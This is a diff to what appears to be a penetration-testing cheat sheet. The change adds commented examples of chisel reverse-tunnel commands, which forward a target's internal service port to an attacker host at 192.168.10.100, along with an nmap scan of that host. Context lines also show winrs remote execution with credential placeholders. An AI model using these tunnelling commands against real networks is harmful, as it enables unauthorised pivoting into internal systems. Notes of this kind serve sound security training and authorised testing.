@@ -655,6 +655,7 @@ winrs -R:<host> -u:<username> -p:<password> cmd
 attacker
 
 ```shell
+# ./chisel server -p 80 --reverse -v
 ./chisel server -p <attacker port> --reverse -v
 ```
 
@@ -669,6 +670,9 @@ Windows
 Linux
 
 ```shell
+# transport target service on port 1234 to our host(192.168.10.100) port 5678
+# ./chisel client 192.168.10.100:80 R:5678:localhost:1234
+# nmap -sC -sV -p5555 192.168.10.100 -Pn
 ./chisel client <attacker ip>:<attacker port> R:<attacker proxy port>:localhost:<target service port>
 ```
 
